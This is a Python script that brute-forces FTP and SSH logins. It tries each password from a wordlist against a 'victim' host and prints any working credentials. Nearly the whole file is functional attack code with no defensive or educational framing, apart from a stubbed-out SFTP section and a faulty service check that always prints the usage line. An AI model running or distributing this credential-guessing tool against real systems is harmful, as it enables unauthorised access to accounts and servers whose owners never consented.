import ftplib
from colorama import Fore, init
from pathlib import Path
import paramiko
import socket
import time
import argparse
from progress.spinner import MoonSpinner



####################### FTP BRURUTEFORCER #######################
def process_ftp(host,username,password):
    try:

        connect = ftplib.FTP()
        print(f"{Fore.MAGENTA}[!] host: {host}   login:{username}    password: {password}", Fore.RESET)
        connect.connect(host, 21, timeout=5)
        connect.login(username, password)
    except ftplib.error_perm:
        return False
    else:
        print(f"{Fore.GREEN}[+] Found credentials >> {username}:{password}",Fore.RESET)
        return True


def Burtrforce_ftp(host,username,path):
    passwords = Path(path)
    # passlist = open(passwords).read().splitlines()
    with open(passwords, errors="ignore") as passlist:
        for password in passlist:
            password = ''.join(password.split("\n"))
            if process_ftp(host,username,password):
                break



####################### SFTP BRURUTEFORCER #######################

# ###################### SSH BRURUTEFORCER #######################

def process_ssh(host,username,password):

    connect = paramiko.SSHClient()
    connect.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        connect.connect(hostname=host,username=username,password=password,timeout=3)
    except socket.timeout:
        print(f"{Fore.RED}[!] Host: {host} is unreachable, timed out", Fore.RESET)
        return False
    except paramiko.AuthenticationException:
        print(f"{Fore.MAGENTA}[!] host: {host}   login: {username}    password: {password}", Fore.RESET)
        return False
    except paramiko.ssh_exception.SSHException:
        print(f"{Fore.BLUE}[*] Thresholds, retrying with delay...",Fore.RESET)
        time.sleep(20)
    else:
        print(f"{Fore.GREEN}[+] Found credentials >> {username}:{password}", Fore.RESET)
        return True


def Burtrforce_ssh(host,username,path):
    passwords = Path(path)
    with open(passwords, errors="ignore") as passlist:
        for password in passlist:
            password = ''.join(password.split("\n"))
            if process_ssh(host,username,password):
                break






# #######################  MAIN FUN #######################
# #
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ultimate Burtrforcer")
    parser.add_argument("-S","--service", help="Which service do you wont to bruteforce")
    parser.add_argument("-IP","--host", help="Hostname or IP Address of the victim to bruteforce.")
    parser.add_argument("-P", "--wordlist", help="Wordlist that contain password list in each line.")
    parser.add_argument("-U", "--user", help="Username to connect.")

    args = parser.parse_args()
    service = args.service
    host = args.host
    path = args.wordlist
    username = args.user
    if service == "ftp":
        Burtrforce_ftp(host,username,path)
    if service == "ssh":
      Burtrforce_ssh(host,username,path)
    if service != "ssh" or "ftp":
        print("[-h] [-S SERVICE] [-IP HOST] [-P WORDLIST] [-U USER]")


